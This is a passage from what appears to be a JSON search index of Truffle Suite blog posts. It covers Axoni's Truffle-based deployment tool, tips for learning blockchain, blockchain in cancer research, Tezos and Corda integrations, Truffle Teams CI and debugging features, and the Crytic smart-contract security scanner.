extensible capacity to side-step undesired intermediaries (yes, these exist for banks too...). In a more precise technical sense, our platform borrows certain concepts from Ethereum (e.g. accounts, contracts, gas...) and, importantly, we make efforts to comply with Ethereum-world interfaces (e.g. evm bytecode, web3 JSON-rpc). Of course, an up-shot of the last is the ability to take part in all the innovation taking place in the broader Ethereum ecosystem, including client-side libraries that enable a \"tastier\" application development process. To this end, within the last year we have worked to leverage the Truffle suite and ecosystem to great effect. In fact, as reported , it is fair to say that Truffle serves by and large as the main toolset for on-chain application development at Axoni.","title":"Axoni Background"},{"location":"blog/axonis-enterprise-use-of-truffle/index.html#using-truffle-at-axoni","text":"It was a delight for us to find that, given our compliance with the web3 JSON-RPC spec, truffle basically works \"out-of-the-box\" with no extensive customization required for many very useful stages in the application lifecycle: develop, build, test.... One notable exception: we found the native truffle migrate functionality not extensible to our use case. In part, this is due to the fact that our smart contract applications implement something similar to the proxy pattern , which runs counter to the \"migration\" paradigm. On the other hand, and for reasons beyond the scope of this post, tools such as zoslib designed to handle upgradeable smart contract application deployments, generate smart contract implementations incompatible with our use case. At a high level, our smart contract framework is optimized for high-throughput and highly complex Solidity applications which enables the ability to make automatic upgrades based on semantic versioning. [ Note: I plan to speak more about our particular use cases and smart contract topologies at Trufflecon on August 3rd] In any case, especially due to the often very high levels of complexity entailed by our use cases\u2013 combined with the noted application-level gotcha's of upgrade design patterns in solidity itself \u2013we are biased towards a simple and opinionated declarative format that application and production engineers can easily understand and (when needed) manipulate. This raises the question -- why use truffle for this? It seems there are at least three reasons: truffle-config.js / truffle.js serves as an already existing central source of shared information about various network providers relevant for a particular application developer. It only makes sense to extend this format for use in production-like environments as well. Truffle code artifacts, a battle-tested standard for smart contracts and solidity code, in particular, provide a common interface for a toolchain. By virtue of using truffle, there is no need to re-create this format. For a non-development deployment, a contracts_build_directory parameter is supplied, which results in a pull from a remote artifacts repository. Obviously @truffle/contract itself provides a nice object oriented interface for deploying and performing operations on contracts within this script, thus avoiding any reinventing the wheel within the deployment library itself. Thus, we ventured to build a package on top of truffle that manages configuration-driven smart contract deployments and upgrades.","title":"Using Truffle at Axoni"},{"location":"blog/axonis-enterprise-use-of-truffle/index.html#building-a-truffle-based-deployment-tool","text":"The first question is what the configuration file should look like? We determined the \"Straw Man\" to be, simply, a two-dimensional list of job types and associated contracts specified for deployment. Starting with this, we found another concept we needed to add (\"custom-partition\") that is specific to Axcore, relating to the way the node software provisions data across network partitions; certain contracts are provisioned differently from others. In addition to this, we found that the only other concept we needed was a parameter specifying dependencies (\"deps\") that linearizes to a certain order to deployment (which may be necessary, for instance, if a given storage address stores reference to another). For concision, we added limited regex support. In the end, we arrived at a yaml-based file looking very much like the below: version : 0.0.1 setup : partitions : - custom-partition : * - custom-partition : ^public-common contracts : - name : MagmaRegistryFooStorage - name : MagmaRegistryBarStorage deps : - MagmaRegistryFooStorage upgrade : partitions : - custom-partition : \"*\" contracts : - name : MagmaRegistryFoo - name : MagmaRegistryBar In terms of implementation, a truffle exec script reads this configuration file, and for each contract, a) deploys the contract b) performs some basic API configuration and c) installs it in the application through invoking a basic initialization method. The basic top-level run (truffle exec) script looks very much like the below: const run = async ( done ) => { let jobParams = args ; // Configure specific variables for a PROD-like environment: if ( process . env . ENV === 'PROD' ) { jobParams = Object . assign ( args , handleProd ()); } //hoisting injected vars to global scope: global . web3 = web3 ; global . artifacts = artifacts ; // Create instance of job based on type const jobInstance = new Job ( jobParams . job , jobParams ); //Run job by deploying and invoking an initialization method on each contract await jobInstance . run (). catch ( e => done ( e )); done (); }; A command-line client can specify a given job to run, such as the \"upgrade\" job specified above. Given the above configuration, the below command would deploy (if necessary) and initialize \"MagmaRegistryFooStorage\", followed by \"MagmaRegistryBarStorage\" from a given artifacts repository: etna --job upgrade --contracts_build_directory /path/to/artifacts","title":"Building a Truffle-Based Deployment Tool"},{"location":"blog/axonis-enterprise-use-of-truffle/index.html#future-plans-and-an-announcement","text":"I am pleased to announce that we plan to open-source our core Solidity smart contract library, which provides an alternative version of the Proxy pattern, along with this aforementioned deployment tool. We believe both could be useful both for private and public applications and the Axoni team is excited to see what the community builds with these tools. In the meantime, we hope the above at least provides a high-level example of an approach to building lightweight extensions within truffle, and as a simplifying approach to the smart contract deployment process, especially for Proxy Pattern topologies. The Axoni team and I look forward to discussing this topic and much more (such as Axlang, our Scala-based Solidity-alternative ) at Trufflecon.","title":"Future Plans and an Announcement"},{"location":"blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/index.html","text":"As a non-technical person, it feels like it takes 1.21 gigawatts to keep up with the speed of technology - even Doc Brown himself couldn't have predicted all of the technological advancements with his flux capacitor. Not only are we trying to keep up with technologies like blockchain, machine learning, and AI, but we have an overwhelming amount of information on the web all at the click of a mouse. It's overwhelming to the point that it's difficult to even know where to begin. However, online blockchain educational materials have started to ramp up. As I write this, I'm confident I'll start seeing \u201c Blockchain for dummies\u201d online course advertisements on my browser (Opt-in, of course, because I'm using Brave). Mind-blowing! Let me help you begin by slowing down in order to speed up effectively. So you're someone who's not technical that wants to learn blockchain - great! Whether you're technical or non-technical isn't necessarily contingent on understanding an emerging technology like blockchain. Rather it's how you position yourself in the marketplace where you'll start to see the fruits of your labor. Human to human chit chatting \u00b6 First things first, human to human interaction is where you want to start and it's awesome! Yes, YouTube will always be there for you - or at least until your battery dies, but dialoguing with another person and in this case, someone well-versed in blockchain will lay a strong foundation to springboard yourself into understanding this industry. I hate to use the phrase \u201ctrust me,\u201d but trust me, as someone who's not that technical and has a background in Kinesiology, I can assure you that learning from the great minds of my Truffle developers has helped me grasp the concepts of blockchain technology. I'll say, most folks that are experts in their field generally have no problem chatting with a hungry and curious mind. If anything, it's flattering when I get approached to explain blockchain to someone who desires to understand it. We're gifted with the ability to use analogies and other practical ways of explanations that can make light of things that often feel dark and hard to see. Check out this great analogy on sharding ! Guess what? Developers don't mind talking to non-technical people who are trying to understand a particular technology like blockchain. It's a ridiculous stereotype to think devs only like to chat with other devs. If that were the case, how could a business be run successfully? In fact, oftentimes the best explanations come from the top experts. Developers don't like jargon or complexity either. We even gave the term developer operations a cute little nickname like DevOps. Seek out the developer in the blockchain space and ask away...better yet, reach out to one of us at Truffle\u2013we love our community! Meet-ups \u00b6 Go to your local blockchain meetups. There's probably more than a few that are available for you to attend. Meetups can be two-fold, namely, one to obtain knowledge and the other for networking, which can sometimes lead to a job. I can't tell you how many times I've hired someone that I initially met at a meetup. It sure beats throwing your resume on a job board hoping that it will stick. Relationships become the most valuable asset you can have to aid in your next employment opportunity. Moreover, everyone at a meetup shares one common trait. A passion for blockchain. Social Media \u00b6 Maybe you're a little shy and don't want to network (although I highly recommend it!). There's a myriad of resources available online to learn the underpinnings of blockchain technology. You can visit our Truffle University page for more information taking our courses. If you like to learn through watching other people's conversations, Twitter is the place to go . You can make your way over to Quora if you have specific questions about blockchain. Don't want people to know who you are, Reddit has phenomenal ELI5 (explain it like I'm 5) explanations. Read a Book \u00b6 Some people enjoy a nice old fashion book. By far the best book to understand blockchain is Mastering Bitcoin and Mastering Ethereum by Andreas Antonopoulos. Podcast \u00b6 Listening to a Podcast is great. Especially when you're on the go. It's a way to redeem your commute to work, get through a workout session, or just something to pass the time. Often times, podcast hosts will have guest in the blockchain space to give an objective perspective on what the challenges and successes are with the technology. ![TruffleCon](/img/blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/trufflecon.png) Finally, and I may be a little bias, but if you really want to increase the pace at which you can comprehend blockchain then go to TruffleCon! Come say hi to all of us at Truffle. Come say hello to all of the speakers and blockchain company representatives. Ask us questions. Let us help you understand blockchain better. Let's network. Let's have a relationship that will enable amicability. Or better yet, let's interop with each other to leverage the power of blockchain for careers, security, and better transparency in an ever-growing technological world, one node at a time.","title":"The Best Methods to Understand Blockchain Technology if You\u2019re Not A Developer"},{"location":"blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/index.html#human-to-human-chit-chatting","text":"First things first, human to human interaction is where you want to start and it's awesome! Yes, YouTube will always be there for you - or at least until your battery dies, but dialoguing with another person and in this case, someone well-versed in blockchain will lay a strong foundation to springboard yourself into understanding this industry. I hate to use the phrase \u201ctrust me,\u201d but trust me, as someone who's not that technical and has a background in Kinesiology, I can assure you that learning from the great minds of my Truffle developers has helped me grasp the concepts of blockchain technology. I'll say, most folks that are experts in their field generally have no problem chatting with a hungry and curious mind. If anything, it's flattering when I get approached to explain blockchain to someone who desires to understand it. We're gifted with the ability to use analogies and other practical ways of explanations that can make light of things that often feel dark and hard to see. Check out this great analogy on sharding ! Guess what? Developers don't mind talking to non-technical people who are trying to understand a particular technology like blockchain. It's a ridiculous stereotype to think devs only like to chat with other devs. If that were the case, how could a business be run successfully? In fact, oftentimes the best explanations come from the top experts. Developers don't like jargon or complexity either. We even gave the term developer operations a cute little nickname like DevOps. Seek out the developer in the blockchain space and ask away...better yet, reach out to one of us at Truffle\u2013we love our community!","title":"Human to human chit chatting"},{"location":"blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/index.html#meet-ups","text":"Go to your local blockchain meetups. There's probably more than a few that are available for you to attend. Meetups can be two-fold, namely, one to obtain knowledge and the other for networking, which can sometimes lead to a job. I can't tell you how many times I've hired someone that I initially met at a meetup. It sure beats throwing your resume on a job board hoping that it will stick. Relationships become the most valuable asset you can have to aid in your next employment opportunity. Moreover, everyone at a meetup shares one common trait. A passion for blockchain.","title":"Meet-ups"},{"location":"blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/index.html#social-media","text":"Maybe you're a little shy and don't want to network (although I highly recommend it!). There's a myriad of resources available online to learn the underpinnings of blockchain technology. You can visit our Truffle University page for more information taking our courses. If you like to learn through watching other people's conversations, Twitter is the place to go . You can make your way over to Quora if you have specific questions about blockchain. Don't want people to know who you are, Reddit has phenomenal ELI5 (explain it like I'm 5) explanations.","title":"Social Media"},{"location":"blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/index.html#read-a-book","text":"Some people enjoy a nice old fashion book. By far the best book to understand blockchain is Mastering Bitcoin and Mastering Ethereum by Andreas Antonopoulos.","title":"Read a Book"},{"location":"blog/best-methods-to-understand-blockchain-if-youre-not-a-developer/index.html#podcast","text":"Listening to a Podcast is great. Especially when you're on the go. It's a way to redeem your commute to work, get through a workout session, or just something to pass the time. Often times, podcast hosts will have guest in the blockchain space to give an objective perspective on what the challenges and successes are with the technology.","title":"Podcast"},{"location":"blog/blockchain-will-cure-cancer/index.html","text":"Physicians and scientists will be the actual agents behind a cure for cancer. But in their potential to disrupt the very nature of medical research and treatment, blockchain-based solutions are extremely likely to light the way. It is important when examining any new technology to consider the ways in which it may change the world. Join me here as we briefly look at how blockchain can help lead us to a world without cancer. Cancer is a significant public health issue in the United States and around the world. In the United States alone, an estimated 1.7 million new cancer cases were diagnosed in 2018. This number is expected to increase drastically as time goes on. Several barriers exist to finding a cure for cancer. Key among them are data challenges, difficulty quickly assessing the effectiveness of new treatments, and the financing required to fund research and treatment. Fortunately, blockchain technology is already providing avenues for addressing these barriers and bringing us closer to a cure for cancer. It\u2019s in the Data \u00b6 At its core, the path to curing cancer lies in accessing and evaluating as much data about the disease as possible. Blockchain solutions for medical data are already being proposed and tested . The primary benefits of using blockchain technology for storing and processing medical data lie in the portability and patient ownership of that data. On their own, these benefits are as helpful to cancer patients as they are to other medical patients. The particular usefulness of blockchain for cancer data lies in the ability of patients to volunteer their medical records to be used in research. This data will need to be anonymized and, of course, regulatory hurdles are likely to exist, but aggregating medical data from potentially millions of patients around the world will allow physicians and researchers access to unprecedented levels of information about the disease they seek to cure. BreastWeCan.org is one fledgling organization seeking to increase the base of data upon which further cancer research can be built. By encouraging women to upload their mammogram scans and other breast cancer images onto a blockchain, the company hopes to allow an AI to then study these images and share what it learns. Better knowledge sharing means more effective treatments \u00b6 Information about cancer treatment and the results thereof is essential to finding a cure. From clinical trials to variation in responses to existing treatments among patients, information is the key. Blockchain technology can help in this respect by encouraging patients to share their treatment experiences and encouraging physicians to collaborate in their treatment attempts. One U.S. company has piloted a blockchain-based system for evaluating patient responses to cancer treatment. Encouraging patients and oncologists to provide information with an \u201cOnco\u201d coin, OncoPower will allow oncologists access to \u201cde-identified \u2026 details like co-morbidity, specific cancer type, lines of therapy, and actual drugs used for treatment.\u201d OncoPower\u2019s promise lies in the ability to anonymize medical data, put it on a blockchain, and make it accessible to the medical community. This will encourage collaboration and knowledge-sharing amongst health care practitioners and researchers, increasing the visibility of various health outcomes and leading to faster iteration when it comes to experimental treatments. Another exciting treatment approach by Hypertrust Patient Data Care in Germany focuses on the immutable and verifiable aspects of blockchain to ensure that the supply chain for very sensitive immunotherapy treatments can be made as reliable as possible. Hypertrust tracks medication from \u201cneedle to needle\u201d and leverages the transparency of a blockchain to improve patient outcomes. Targeted Financing \u00b6 One thing that blockchain technology does incredibly well is to provide opportunities for decentralized governance and transparency. In the case of financing cancer research, blockchain could prove to be the silver bullet needed to ensure that funding goes where it will be most useful. While it does not appear that cancer fundraising has made its way onto a blockchain just yet, the ability of donors to contribute to cancer research in a tangible and trackable way is likely to increase donations and empower engagement within the scientific community. Putting cancer funding on a blockchain and encouraging the scientific community to engage in that blockchain\u2019s governance could provide a catalyst for encouraging efficient, transparent, and collaborative research efforts. Looking Ahead \u00b6 Blockchain technology is still in early stages, and it may be too soon to know precisely in which ways it may change our world. Developments in the medical applications of blockchain technology are very encouraging. Cancer has evaded a cure for many years, and the advent of new ways for scientists and physicians to learn, collaborate, and experiment may be just what the medical community needs.","title":"Blockchain Will Cure Cancer"},{"location":"blog/blockchain-will-cure-cancer/index.html#its-in-the-data","text":"At its core, the path to curing cancer lies in accessing and evaluating as much data about the disease as possible. Blockchain solutions for medical data are already being proposed and tested . The primary benefits of using blockchain technology for storing and processing medical data lie in the portability and patient ownership of that data. On their own, these benefits are as helpful to cancer patients as they are to other medical patients. The particular usefulness of blockchain for cancer data lies in the ability of patients to volunteer their medical records to be used in research. This data will need to be anonymized and, of course, regulatory hurdles are likely to exist, but aggregating medical data from potentially millions of patients around the world will allow physicians and researchers access to unprecedented levels of information about the disease they seek to cure. BreastWeCan.org is one fledgling organization seeking to increase the base of data upon which further cancer research can be built. By encouraging women to upload their mammogram scans and other breast cancer images onto a blockchain, the company hopes to allow an AI to then study these images and share what it learns.","title":"It\u2019s in the Data"},{"location":"blog/blockchain-will-cure-cancer/index.html#better-knowledge-sharing-means-more-effective-treatments","text":"Information about cancer treatment and the results thereof is essential to finding a cure. From clinical trials to variation in responses to existing treatments among patients, information is the key. Blockchain technology can help in this respect by encouraging patients to share their treatment experiences and encouraging physicians to collaborate in their treatment attempts. One U.S. company has piloted a blockchain-based system for evaluating patient responses to cancer treatment. Encouraging patients and oncologists to provide information with an \u201cOnco\u201d coin, OncoPower will allow oncologists access to \u201cde-identified \u2026 details like co-morbidity, specific cancer type, lines of therapy, and actual drugs used for treatment.\u201d OncoPower\u2019s promise lies in the ability to anonymize medical data, put it on a blockchain, and make it accessible to the medical community. This will encourage collaboration and knowledge-sharing amongst health care practitioners and researchers, increasing the visibility of various health outcomes and leading to faster iteration when it comes to experimental treatments. Another exciting treatment approach by Hypertrust Patient Data Care in Germany focuses on the immutable and verifiable aspects of blockchain to ensure that the supply chain for very sensitive immunotherapy treatments can be made as reliable as possible. Hypertrust tracks medication from \u201cneedle to needle\u201d and leverages the transparency of a blockchain to improve patient outcomes.","title":"Better knowledge sharing means more effective treatments"},{"location":"blog/blockchain-will-cure-cancer/index.html#targeted-financing","text":"One thing that blockchain technology does incredibly well is to provide opportunities for decentralized governance and transparency. In the case of financing cancer research, blockchain could prove to be the silver bullet needed to ensure that funding goes where it will be most useful. While it does not appear that cancer fundraising has made its way onto a blockchain just yet, the ability of donors to contribute to cancer research in a tangible and trackable way is likely to increase donations and empower engagement within the scientific community. Putting cancer funding on a blockchain and encouraging the scientific community to engage in that blockchain\u2019s governance could provide a catalyst for encouraging efficient, transparent, and collaborative research efforts.","title":"Targeted Financing"},{"location":"blog/blockchain-will-cure-cancer/index.html#looking-ahead","text":"Blockchain technology is still in early stages, and it may be too soon to know precisely in which ways it may change our world. Developments in the medical applications of blockchain technology are very encouraging. Cancer has evaded a cure for many years, and the advent of new ways for scientists and physicians to learn, collaborate, and experiment may be just what the medical community needs.","title":"Looking Ahead"},{"location":"blog/branching-out-announcing-tezos-support-in-truffle/index.html","text":"If you've been following Truffle's development, you'll notice that our tools already support a handful of exciting platforms: Ethereum , Quorum , Axoni , Hyperledger Fabric-EVM , Hyperledger Sawtooth , and Hyperledger Burrow . What's common amongst these chains is that they all use the Ethereum Virtual Machine under the hood. Ethereum is very near and dear to our hearts -- it's where we got our start, and where we are the most competent. But we're branching out, in large part due to market demand. In December we released a beta Corda-flavored Ganache as part of our initial support for the Corda platform . And today, we branch out even further. I'm excited to announce Tezos integration into the Truffle command line tool. Right now, at this very moment, you can download a Tezos-specific version of Truffle and start building smart contracts on Tezos networks using the time-tested tooling you know and love. And if you're a Tezos native who got your start building on top of the Tezos platform, then this means professional-grade tooling has finally arrived. We chose Tezos as our first non-EVM chain because of its blossoming developer community. In our position as tool builders, we go where the market takes us: If enough people ask for Tezos support, we listen. This market demand was coupled with an active and interested group of core developers, and a blockchain architecture that's similar to Ethereum. Ultimately, Tezos is \"EVM-like\". This makes it a great candidate for integration, fitting into Truffle like a glove. Are you a developer who wants to build on top of Tezos using Truffle? Check out our documentation and our quick start guide . It's important to note that our integration with Tezos is experimental. As of now you'll need to download a special version of Truffle to start building on Tezos. This is by design: Integrating a new blockchain into a common workflow takes some work, and we want to ensure we keep the same level of quality for our existing chains while we work out the kinks. You can be extremely helpful here! If you run into an issue using the Tezos version of Truffle, let us know! You can file an issue at our issue tracker , or reach out to us on Spectrum . Our plan over the coming months is to harden our Tezos integration and ultimately release it under the mainline version of Truffle. We\u2019ve also expanded our commitment to the Tezos project by finalizing plans for further integrations: 1) a Tezos-flavored Ganache ; and 2) full support for the SmartPy programming language. Though this is our first foray into supporting non-EVM blockchains, I'd like to take this moment to reaffirm our support and interest in Ethereum and Ethereum-based blockchains. You'll see many more announcements in 2020 about how we're planning to make development on both Ethereum 1.0 and Ethereum 2.0 better. Stay tuned. I'd like to thank some standout developers in the Tezos community for making this integration a reality. First, are the developers from Stove Labs , Matej \u0160ima & Istvan Deak. They helped significantly in stress testing our integration and providing continuous feedback during development. I'd also like to thank Taquito developers Jev Bj\u00f6rsell and Simon B.Robert for creating an easy to use library for communicating with and interacting with the Tezos blockchain (for Ethereum developers, this is the Web3.js equivalent). Last but not least, a big shout out to the developers of the LIGO programming language, Gabriel Alfour and the rest of the LIGO development team, for making LIGO compiler integration easy on us. Cheers to you! We're excited to announce Tezos support as one of many integrations to come in 2020. Thank you for your continued support of our work, and the opportunity to make your development life easier. Happy coding! Tim -- Founder & CEO, Truffle Suite","title":"Branching Out - Announcing Tezos Support in Truffle"},{"location":"blog/branching-out-phase-2-of-corda-flavored-ganache/index.html","text":"April has been a big month for Truffle Suite! Earlier this month we branched out and announced Tezos integration into the Truffle command line tool. If you remember, back in December we released a beta Corda-flavored Ganache as part of our initial support for the Corda platform. Today, we are excited to share Phase 2 of Corda-flavored Ganache, v2.4.0 with you! Phase 2 includes more robust features for Corda including Corda CRaSH Shell, network map visualization, and a version picker. We're thrilled to release Phase 2 of Ganache for Corda, an open source blockchain platform built for business applications, as this continues to lower the barrier to entry for Corda developers. These updates enable developers to easily set up a local network on their machines, letting them inspect the state of that network across various nodes and giving them visibility into transactions normally hidden by a live Corda network's privacy protections. Features Include: One-click Corda network configuration and initialization, so you can focus on what matters most: your application. Multiple workspaces for all of your Corda projects including a Corda network map, notaries, nodes, transactions, accounts, and ledgers. Simple testing for interoperability with the Version Picker node. Easy access to all your application's data, including network map, notaries, nodes, transactions, and states. Visualizations of node connections with the Corda network map graph Embedded Corda CRaSH Shell to provide control over your nodes and project data As always, this release is compatible with the latest versions of Windows \u229e, Mac OS \ud83c\udf4e, and Linux \ud83d\udc27. You can now run and interact with a Corda network without installing prerequisites like Java, PostgreSQL, Corda binaries, docker, etc! If you are a Corda developer who wants to use Ganache with your CorDapp check out our documentation and our quick start guide . We are also hosting a joint webinar with R3 on May 6th to demonstrate these features along with how this fits into existing Corda developer\u2019s\u2019 workflow. In closing, I\u2019d like to thank our partners at R3, Todd McDonald, Lisa Chiong, Tiffany Sarmiento, Chris Chabot, and Nick Rogers for their collaboration, vision, and teamwork. I\u2019d also like to thank David Murdoch and Nick Paterno from the Truffle team for their tireless efforts to make Corda Flavored Ganache a reality. Thank you for your continued support and the opportunity to make your development life easier. Happy coding! Tim -- Founder & CEO, Truffle Suite","title":"Branching Out - Phase 2 of Corda-flavored Ganache"},{"location":"blog/bring-your-own-ci-byoci-with-truffle-teams/index.html","text":"Truffle Teams has always offered an internal continuous integration (CI) service. This service is great for getting up and running quickly since it requires no configuration to run your Truffle tests. We also want to support teams who have established CI setups outside of Truffle Teams. Thanks to the fantastic work by Erin Shaben , you can now leverage your existing GitHub-integrated build services ! Using an Existing CI Service \u00b6 The BUILDS settings screen Enabling external CI for a repository only requires a single checkbox! Navigate to your user or organization\u2019s settings page by clicking the user/org icon in the navbar. From there, click the BUILDS tab, then check the checkbox next to the repository of your choice! Build with external CI enabled Now, when you navigate to the builds page for that repository, any new builds will show a list of your GitHub-integrated build services, along with their respective statuses. For more detailed information on the external CI service, check out our documentation here . For more detailed information on adding services to GitHub via their Marketplace, check out the GitHub Marketplace docs here . Future Integration \u00b6 We want Truffle Teams to be the most effective devops tool in the blockchain space for both new and existing teams. Let us know what you think about this integration solution, and if your team has other needs we haven\u2019t met yet. Thanks! Josh Quintal -- Head of Product & Marketing, Truffle Suite","title":"Bring Your Own CI (BYOCI) with Truffle Teams"},{"location":"blog/bring-your-own-ci-byoci-with-truffle-teams/index.html#using-an-existing-ci-service","text":"The BUILDS settings screen Enabling external CI for a repository only requires a single checkbox! Navigate to your user or organization\u2019s settings page by clicking the user/org icon in the navbar. From there, click the BUILDS tab, then check the checkbox next to the repository of your choice! Build with external CI enabled Now, when you navigate to the builds page for that repository, any new builds will show a list of your GitHub-integrated build services, along with their respective statuses. For more detailed information on the external CI service, check out our documentation here . For more detailed information on adding services to GitHub via their Marketplace, check out the GitHub Marketplace docs here .","title":"Using an Existing CI Service"},{"location":"blog/bring-your-own-ci-byoci-with-truffle-teams/index.html#future-integration","text":"We want Truffle Teams to be the most effective devops tool in the blockchain space for both new and existing teams. Let us know what you think about this integration solution, and if your team has other needs we haven\u2019t met yet. Thanks! Josh Quintal -- Head of Product & Marketing, Truffle Suite","title":"Future Integration"},{"location":"blog/crytic-continuous-assurance-for-smart-contracts/index.html","text":"We are proud to announce our new Smart contract security product: https://crytic.io/ . Crytic provides continuous assurance for smart contracts. The platform reports build status on every commit and runs a suite of security analyses for immediate feedback. The beta access will be open soon. Follow us on twitter to be notified and benefit from the service as soon as possible! The first three months are free. How Crytic will secure your smart contracts \u00b6 Once connected to your GitHub repository, Crytic will: Run our static analyzer Slither , which detects the most common smart contracts vulnerabilities and will save you from critical mistakes. Run your Truffle tests continuously to ensure that no bug is added while developing your project. Slither will analyze your codebase for more than 60 security flaws, including reentrancy, integer overflows, race conditions, and many others. Half of these flaw-detectors are private and were not available to the public. They can detect flaws for which public knowledge is limited and that no other tool can find. The recent GridLock bug would have been detected ahead of time using Crytic! We built this platform for developers, so we integrated it with GitHub. It will watch every commit and branch to ensure that bugs are not added during development. In addition, Crytic will run the checks on every PR to facilitate your code review. For every security issue found, Crytic will: Show you a detailed report on the bug, including source-code highlighting. Allow you to create a GitHub issue to keep track of the fixes easily. Let you triage the results, so you can decide what needs to be fixed. Quick Walkthrough \u00b6 Adding Crytic to your system is straightforward: you just need to connect to your GitHub repository. We have first-class support for Truffle; it works out of the box! We also support most of the other smart contract platforms, including Embark, Dapp, and Etherlime. After adding your repository, the dashboard (Figure 1) will show you a summary of the project, like this crytic-demo : Figure 1: Crytic Dashboard From now on, you will benefit from continuous security analyses. Issue reports \u00b6 Finding an issue is only the first part. Crytic will provide you with detailed information you need about the bug to fix it: Figure 2: Report A careful reader will notice the vulnerability here: function constuctor creates a public function (with a typo!) that is callable by anyone instead of being run only at initialization. Crytic will detect these types of critical mistakes instantaneously. Triaging issues \u00b6 Once a bug has been found, the user can decide to: create a GitHub issue, to easily keep track of the fix, or discard the issue. Figure 3: GitHub Issue Generated Crytic follows the modifications to your code and reports only new bugs that are introduced. Each new PR will be analyzed automatically: Figure 4: Pull Request Integration What\u2019s next for Crytic \u00b6 We are constantly improving Crytic. Expect to see new bug detectors and new features in the future. We are planning to add: Echidna and Manticore integration: to ensure your code is checked for custom security properties. Automatic bug repair: Crytic will propose patches to fix the issues it finds. Slither printer integration : to help visualize the underlying details of your code. Delegatecall proxy checker : to prevent you from making critical\u2014and all too common\u2014mistakes in your upgradeability process . Questions? Bring them to TruffleCon, and pose them to us at our booth or at our Friday workshop on automated vulnerability detection tools ! Whether or not you can make it to TruffleCon, join our slack channel (#crytic) for support, and watch @CryticCI to find out as soon as our beta is open.","title":"Crytic - Continuous Assurance for Smart Contracts"},{"location":"blog/crytic-continuous-assurance-for-smart-contracts/index.html#how-crytic-will-secure-your-smart-contracts","text":"Once connected to your GitHub repository, Crytic will: Run our static analyzer Slither , which detects the most common smart contracts vulnerabilities and will save you from critical mistakes. Run your Truffle tests continuously to ensure that no bug is added while developing your project. Slither will analyze your codebase for more than 60 security flaws, including reentrancy, integer overflows, race conditions, and many others. Half of these flaw-detectors are private and were not available to the public. They can detect flaws for which public knowledge is limited and that no other tool can find. The recent GridLock bug would have been detected ahead of time using Crytic! We built this platform for developers, so we integrated it with GitHub. It will watch every commit and branch to ensure that bugs are not added during development. In addition, Crytic will run the checks on every PR to facilitate your code review. For every security issue found, Crytic will: Show you a detailed report on the bug, including source-code highlighting. Allow you to create a GitHub issue to keep track of the fixes easily. Let you triage the results, so you can decide what needs to be fixed.","title":"How Crytic will secure your smart contracts"},{"location":"blog/crytic-continuous-assurance-for-smart-contracts/index.html#quick-walkthrough","text":"Adding Crytic to your system is straightforward: you just need to connect to your GitHub repository. We have first-class support for Truffle; it works out of the box! We also support most of the other smart contract platforms, including Embark, Dapp, and Etherlime. After adding your repository, the dashboard (Figure 1) will show you a summary of the project, like this crytic-demo : Figure 1: Crytic Dashboard From now on, you will benefit from continuous security analyses.","title":"Quick Walkthrough"},{"location":"blog/crytic-continuous-assurance-for-smart-contracts/index.html#issue-reports","text":"Finding an issue is only the first part. Crytic will provide you with detailed information you need about the bug to fix it: Figure 2: Report A careful reader will notice the vulnerability here: function constuctor creates a public function (with a typo!) that is callable by anyone instead of being run only at initialization. Crytic will detect these types of critical mistakes instantaneously.","title":"Issue reports"},{"location":"blog/crytic-continuous-assurance-for-smart-contracts/index.html#triaging-issues","text":"Once a bug has been found, the user can decide to: create a GitHub issue, to easily keep track of the fix, or discard the issue. Figure 3: GitHub Issue Generated Crytic follows the modifications to your code and reports only new bugs that are introduced. Each new PR will be analyzed automatically: Figure 4: Pull Request Integration","title":"Triaging issues"},{"location":"blog/crytic-continuous-assurance-for-smart-contracts/index.html#whats-next-for-crytic","text":"We are constantly improving Crytic. Expect to see new bug detectors and new features in the future. We are planning to add: Echidna and Manticore integration: to ensure your code is checked for custom security properties. Automatic bug repair: Crytic will propose patches to fix the issues it finds. Slither printer integration : to help visualize the underlying details of your code. Delegatecall proxy checker : to prevent you from making critical\u2014and all too common\u2014mistakes in your upgradeability process . Questions? Bring them to TruffleCon, and pose them to us at our booth or at our Friday workshop on automated vulnerability detection tools ! Whether or not you can make it to TruffleCon, join our slack channel (#crytic) for support, and watch @CryticCI to find out as soon as our beta is open.","title":"What\u2019s next for Crytic"},{"location":"blog/debug-quickly-and-in-context-with-truffle-teams-new-debugger/index.html","text":"If you've used Truffle's debugger, you know it's best-in-class. Until now though, it's been confined to the command line. Today the debugger breaks out of the console to a GUI within Truffle Teams! This is a huge workflow enhancement--allowing us to debug transactions in the places we're already viewing--via the deployment details screen or while monitoring individual contracts. Let's take a look! Note : To use the debugger right away, you'll need to opt-in to Truffle Teams Early Access . Launching the Debugger \u00b6 To launch the debugger, we just need to find a transaction. Head over to the Deployments screen and select a deployment. From there select the transactions tab or click the monitoring button for a contract. You'll notice there's a debug button on each transaction card; clicking it will open the Truffle Teams debugger. Debugging is only a click away! ## Navigating the UI Starting at the top, you'll see the transaction hash along with an icon noting its status and, if applicable, the accompanying error message (1). Below that we have our functions, from left to right: Step Next, Step Over, Step In, Step Out, and Reset (2). Next we have some tabs showing the contracts included in this transaction (3). Finally we have two panes, one showing our Solidity with the current step highlighted in yellow (4). The second with our variables (5). Debugging a failed transaction. At the moment some other enhancements, including breakpoints and syntax highlighting, are coming soon. We wanted to get this powerful feature in your hands as quickly as possible, so we're releasing it now via Early Access. For more information on what to expect from early access, check out [the Truffle Teams Early Access blog post](/blog/try-new-features-first-with-truffle-teams-early-access). For more information, check out [the Truffle Teams Debugger docs](/docs/teams/debugger/debugging-a-transaction) or for general information about Truffle's debugger, check out [the Truffle Debugger docs](/docs/truffle/getting-started/debugging-your-contracts). CHECK OUT THE TRUFFLE TEAMS DEBUGGER ## Continue the Conversation We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! _Josh Quintal, Head of Product & Marketing_","title":"Debug Quickly and in Context with Truffle Teams New Debugger"},{"location":"blog/debug-quickly-and-in-context-with-truffle-teams-new-debugger/index.html#launching-the-debugger","text":"To launch the debugger, we just need to find a transaction. Head over to the Deployments screen and select a deployment. From there select the transactions tab or click the monitoring button for a 